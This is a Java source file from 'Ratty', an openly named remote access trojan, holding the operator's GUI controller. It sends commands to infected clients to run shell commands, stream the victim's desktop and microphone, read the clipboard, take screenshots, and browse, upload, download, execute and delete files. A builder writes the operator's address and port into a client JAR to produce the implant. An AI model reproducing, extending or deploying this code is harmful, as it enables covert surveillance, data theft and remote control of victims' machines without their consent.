package de.sogomn.rat.server.gui;

import static de.sogomn.rat.Ratty.LANGUAGE;

import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.util.HashMap;
import java.util.Set;

import javax.swing.JOptionPane;

import de.sogomn.engine.fx.Sound;
import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.builder.JarBuilder;
import de.sogomn.rat.packet.AudioPacket;
import de.sogomn.rat.packet.ClipboardPacket;
import de.sogomn.rat.packet.CommandPacket;
import de.sogomn.rat.packet.CreateDirectoryPacket;
import de.sogomn.rat.packet.DeleteFilePacket;
import de.sogomn.rat.packet.DesktopPacket;
import de.sogomn.rat.packet.DownloadFilePacket;
import de.sogomn.rat.packet.ExecuteFilePacket;
import de.sogomn.rat.packet.FileRequestPacket;
import de.sogomn.rat.packet.FreePacket;
import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.InformationPacket;
import de.sogomn.rat.packet.PopupPacket;
import de.sogomn.rat.packet.ScreenshotPacket;
import de.sogomn.rat.packet.UploadFilePacket;
import de.sogomn.rat.packet.VoicePacket;
import de.sogomn.rat.packet.WebsitePacket;
import de.sogomn.rat.server.AbstractRattyController;
import de.sogomn.rat.server.ActiveServer;
import de.sogomn.rat.util.FrameEncoder.IFrame;

/*
 * Woah, this is a huge class.
 */
public final class RattyGuiController extends AbstractRattyController implements IGuiController {
	
	private RattyGui gui;
	
	private HashMap<ActiveConnection, ServerClient> clients;
	
	private static final String BUILDER_REPLACEMENT = "connection_data.txt";
	private static final String BUILDER_REPLACEMENT_FORMAT = "%s\r\n%s\r\ntrue";
	private static final String[] BUILDER_REMOVALS = {
		"ping.wav",
		"lato.ttf",
		"gui_tree_icons.png",
		"gui_icon.png",
		"gui_menu_icons.png"
	};
	
	private static final String FREE_WARNING = LANGUAGE.getString("server.free_warning");
	private static final String FREE_OPTION_YES = LANGUAGE.getString("server.free_yes");
	private static final String FREE_OPTION_NO = LANGUAGE.getString("server.free_no");
	private static final String BUILDER_ERROR_MESSAGE = LANGUAGE.getString("builder.error");
	private static final String BUILDER_ADDRESS_QUESTION = LANGUAGE.getString("builder.address_question");
	private static final String BUILDER_PORT_QUESTION = LANGUAGE.getString("builder.port_question");
	
	private static final Sound PING = Sound.loadSound("/ping.wav");
	
	public RattyGuiController() {
		gui = new RattyGui();
		clients = new HashMap<ActiveConnection, ServerClient>();
		
		gui.addListener(this);
	}
	
	/*
	 * ==================================================
	 * HANDLING COMMANDS
	 * ==================================================
	 */
	
	private PopupPacket createPopupPacket() {
		final String input = gui.getInput();
		
		if (input != null) {
			final PopupPacket packet = new PopupPacket(input);
			
			return packet;
		}
		
		return null;
	}
	
	private CommandPacket createCommandPacket() {
		final String input = gui.getInput();
		
		if (input != null) {
			final CommandPacket packet = new CommandPacket(input);
			
			return packet;
		}
		
		return null;
	}
	
	private WebsitePacket createWebsitePacket() {
		final String input = gui.getInput();
		
		if (input != null) {
			final WebsitePacket packet = new WebsitePacket(input);
			
			return packet;
		}
		
		return null;
	}
	
	private AudioPacket createAudioPacket() {
		final File file = gui.getFile("WAV");
		final AudioPacket packet = new AudioPacket(file);
		
		return packet;
	}
	
	private DownloadFilePacket createDownloadPacket(final ServerClient client) {
		final FileTreeNode node = client.fileTree.getLastNodeClicked();
		final String path = node.getPath();
		final DownloadFilePacket packet = new DownloadFilePacket(path);
		
		return packet;
	}
	
	private UploadFilePacket createUploadPacket(final ServerClient client) {
		final File file = gui.getFile();
		
		if (file != null) {
			final FileTreeNode node = client.fileTree.getLastNodeClicked();
			final String path = node.getPath();
			final UploadFilePacket packet = new UploadFilePacket(file, path);
			
			return packet;
		}
		
		return null;
	}
	
	private ExecuteFilePacket createExecutePacket(final ServerClient client) {
		final FileTreeNode node = client.fileTree.getLastNodeClicked();
		final String path = node.getPath();
		final ExecuteFilePacket packet = new ExecuteFilePacket(path);
		
		return packet;
	}
	
	private DeleteFilePacket createDeletePacket(final ServerClient client) {
		final FileTreeNode node = client.fileTree.getLastNodeClicked();
		final String path = node.getPath();
		final DeleteFilePacket packet = new DeleteFilePacket(path);
		
		return packet;
	}
	
	private CreateDirectoryPacket createFolderPacket(final ServerClient client) {
		final String input = gui.getInput();
		
		if (input != null) {
			final FileTreeNode node = client.fileTree.getLastNodeClicked();
			final String path = node.getPath();
			final CreateDirectoryPacket packet = new CreateDirectoryPacket(path, input);
			
			return packet;
		}
		
		return null;
	}
	
	private FreePacket createFreePacket() {
		final int input = gui.showWarning(FREE_WARNING, FREE_OPTION_YES, FREE_OPTION_NO);
		
		if (input == JOptionPane.YES_OPTION) {
			final FreePacket packet = new FreePacket();
			
			return packet;
		}
		
		return null;
	}
	
	private void toggleDesktopStream(final ServerClient client) {
		final boolean streamingDesktop = client.isStreamingDesktop();
		
		client.setStreamingDesktop(!streamingDesktop);
		gui.update();
	}
	
	private void stopDesktopStream(final ServerClient client) {
		client.setStreamingDesktop(false);
		gui.update();
	}
	
	private void toggleVoiceStream(final ServerClient client) {
		final boolean streamingVoice = client.isStreamingVoice();
		
		client.setStreamingVoice(!streamingVoice);
		gui.update();
	}
	
	private void requestFile(final ServerClient client) {
		final FileTreeNode node = client.fileTree.getLastNodeClicked();
		final String path = node.getPath();
		final FileRequestPacket packet = new FileRequestPacket(path);
		
		client.fileTree.removeChildren(node);
		client.connection.addPacket(packet);
	}
	
	private void startBuilder() {
		final File destination = gui.getSaveFile("JAR");
		
		if (destination == null) {
			return;
		}
		
		final String address = gui.getInput(BUILDER_ADDRESS_QUESTION);
		
		if (address == null) {
			return;
		}
		
		final String port = gui.getInput(BUILDER_PORT_QUESTION);
		
		if (port == null) {
			return;
		}
		
		final String replacementString = String.format(BUILDER_REPLACEMENT_FORMAT, address, port);
		final byte[] replacementData = replacementString.getBytes();
		
		try {
			JarBuilder.build(destination, BUILDER_REPLACEMENT, replacementData);
			
			for (final String removal : BUILDER_REMOVALS) {
				JarBuilder.removeFile(destination, removal);
			}
		} catch (final IOException ex) {
			gui.showError(BUILDER_ERROR_MESSAGE + "\r\n" + ex.getMessage());
		}
	}
	
	private void launchAttack() {
		//...
	}
	
	private void handleCommand(final ServerClient client, final String command) {
		if (command == RattyGui.FILES) {
			client.fileTree.setVisible(true);
		} else if (command == DisplayPanel.CLOSED) {
			stopDesktopStream(client);
		} else if (command == RattyGui.DESKTOP) {
			toggleDesktopStream(client);
		} else if (command == RattyGui.VOICE) {
			toggleVoiceStream(client);
		} else if (command == RattyGui.ATTACK) {
			launchAttack();
		} else if (command == RattyGui.BUILD) {
			startBuilder();
		} else if (command == FileTree.REQUEST) {
			requestFile(client);
		}
	}
	
	private IPacket createPacket(final ServerClient client, final String command) {
		IPacket packet = null;
		
		if (command == RattyGui.FREE) {
			packet = createFreePacket();
		} else if (command == RattyGui.POPUP) {
			packet = createPopupPacket();
		} else if (command == RattyGui.CLIPBOARD) {
			packet = new ClipboardPacket();
		} else if (command == RattyGui.COMMAND) {
			packet = createCommandPacket();
		} else if (command == RattyGui.SCREENSHOT) {
			packet = new ScreenshotPacket();
		} else if (command == RattyGui.WEBSITE) {
			packet = createWebsitePacket();
		} else if (command == RattyGui.DESKTOP) {
			packet = new DesktopPacket(true);
		} else if (command == RattyGui.AUDIO) {
			packet = createAudioPacket();
		} else if (command == FileTree.DOWNLOAD) {
			packet = createDownloadPacket(client);
		} else if (command == FileTree.UPLOAD) {
			packet = createUploadPacket(client);
		} else if (command == FileTree.EXECUTE) {
			packet = createExecutePacket(client);
		} else if (command == FileTree.DELETE) {
			packet = createDeletePacket(client);
		} else if (command == FileTree.NEW_DIRECTORY) {
			packet = createFolderPacket(client);
		} else if (command == DisplayPanel.MOUSE_EVENT && client.isStreamingDesktop()) {
			packet = client.displayPanel.getLastMouseEventPacket();
		} else if (command == DisplayPanel.KEY_EVENT && client.isStreamingDesktop()) {
			packet = client.displayPanel.getLastKeyEventPacket();
		} else if (command == RattyGui.VOICE && !client.isStreamingVoice()) {
			packet = new VoicePacket();
		}
		
		return packet;
	}
	
	/*
	 * ==================================================
	 * HANDLING PACKETS
	 * ==================================================
	 */
	
	private void showScreenshot(final ServerClient client, final ScreenshotPacket packet) {
		final BufferedImage image = packet.getImage();
		
		client.displayPanel.showImage(image);
	}
	
	private void handleFiles(final ServerClient client, final FileRequestPacket packet) {
		final String[] paths = packet.getPaths();
		
		for (final String path : paths) {
			client.fileTree.addNodeStructure(path);
		}
	}
	
	private void handleDesktopPacket(final ServerClient client, final DesktopPacket packet) {
		if (!client.isStreamingDesktop()) {
			return;
		}
		
		final IFrame[] frames = packet.getFrames();
		final int screenWidth = packet.getScreenWidth();
		final int screenHeight = packet.getScreenHeight();
		final DesktopPacket request = new DesktopPacket();
		
		client.connection.addPacket(request);
		client.displayPanel.showFrames(frames, screenWidth, screenHeight);
	}
	
	private void handleClipboardPacket(final ClipboardPacket packet) {
		final String message = packet.getClipbordContent();
		
		gui.showMessage(message);
	}
	
	private void handleVoicePacket(final ServerClient client, final VoicePacket packet) {
		if (!client.isStreamingVoice()) {
			return;
		}
		
		final Sound sound = packet.getSound();
		final VoicePacket request = new VoicePacket();
		
		client.connection.addPacket(request);
		sound.play();
	}
	
	private boolean handlePacket(final ServerClient client, final IPacket packet) {
		final Class<? extends IPacket> clazz = packet.getClass();
		
		boolean consumed = true;
		
		if (clazz == ScreenshotPacket.class) {
			final ScreenshotPacket screenshot = (ScreenshotPacket)packet;
			
			showScreenshot(client, screenshot);
		} else if (clazz == FileRequestPacket.class) {
			final FileRequestPacket request = (FileRequestPacket)packet;
			
			handleFiles(client, request);
		} else if (clazz == DesktopPacket.class) {
			final DesktopPacket desktop = (DesktopPacket)packet;
			
			handleDesktopPacket(client, desktop);
		} else if (clazz == ClipboardPacket.class) {
			final ClipboardPacket clipboard = (ClipboardPacket)packet;
			
			handleClipboardPacket(clipboard);
		} else if (clazz == VoicePacket.class) {
			final VoicePacket voice = (VoicePacket)packet;
			
			handleVoicePacket(client, voice);
		} else {
			consumed = false;
		}
		
		return consumed;
	}
	
	/*
	 * ==================================================
	 * HANDLING END
	 * ==================================================
	 */
	
	private void logIn(final ServerClient client, final InformationPacket packet) {
		final String name = packet.getName();
		final String location = packet.getLocation();
		final String os = packet.getOs();
		final String version = packet.getVersion();
		
		client.logIn(name, location, os, version);
		client.addListener(this);
		
		gui.addRow(client);
	}
	
	@Override
	public void packetReceived(final ActiveConnection connection, final IPacket packet) {
		final ServerClient client = getClient(connection);
		final boolean loggedIn = client.isLoggedIn();
		
		if (loggedIn) {
			final boolean consumed = handlePacket(client, packet);
			
			if (!consumed) {
				packet.execute(connection);
			}
		} else if (packet instanceof InformationPacket) {
			final InformationPacket information = (InformationPacket)packet;
			
			logIn(client, information);
		}
	}
	
	@Override
	public void connected(final ActiveServer server, final ActiveConnection connection) {
		final ServerClient client = new ServerClient(connection);
		
		super.connected(server, connection);
		
		clients.put(connection, client);
		
		PING.play();
	}
	
	@Override
	public void disconnected(final ActiveConnection connection) {
		final ServerClient client = getClient(connection);
		
		gui.removeRow(client);
		
		client.removeListener(this);
		client.setStreamingDesktop(false);
		client.setStreamingVoice(false);
		
		clients.remove(connection);
		
		super.disconnected(connection);
	}
	
	@Override
	public void closed(final ActiveServer server) {
		gui.removeAllListeners();
		
		super.closed(server);
	}
	
	@Override
	public void userInput(final String command) {
		final ServerClient client = gui.getLastServerClientClicked();
		final IPacket packet = createPacket(client, command);
		
		if (packet != null) {
			client.connection.addPacket(packet);
		}
		
		handleCommand(client, command);
	}
	
	public final ServerClient getClient(final ActiveConnection searched) {
		final Set<ActiveConnection> clientSet = clients.keySet();
		
		for (final ActiveConnection connection : clientSet) {
			if (connection == searched) {
				final ServerClient client = clients.get(connection);
				
				return client;
			}
		}
		
		return null;
	}
	
}
